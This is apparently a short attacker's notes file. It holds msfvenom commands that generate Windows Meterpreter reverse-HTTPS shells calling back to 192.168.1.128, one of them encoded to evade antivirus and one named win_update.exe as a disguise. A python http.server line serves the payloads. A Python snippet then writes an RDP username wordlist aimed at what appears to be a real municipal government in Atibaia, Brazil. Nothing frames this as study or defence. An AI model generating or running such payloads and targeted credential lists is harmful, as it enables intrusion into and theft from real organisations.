msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Recriando a wordlist personalizada de usuários após reset

usernames = [
    "admin", "administrator", "atibaia", "servidor", "sumas", "sumas57667", "prefeitura",
    "contas", "financeiro", "user01", "user02", "secretaria", "ti", "tecnico", "suporte",
    "gestor", "coordenador", "responsavel", "servidor1", "servidor2", "atibaia.local",
    "a.sumas", "dirigente", "adm.atibaia", "servidor.atibaia", "admin.sumas", "diretoria",
    "admin.ti", "servidor.ti"
]

# Salvar a wordlist em arquivo
userlist_path = "/mnt/data/userlist_atibaia_rdp.txt"
with open(userlist_path, "w") as f:
    for user in usernames:
        f.write(user + "\n")

userlist_path
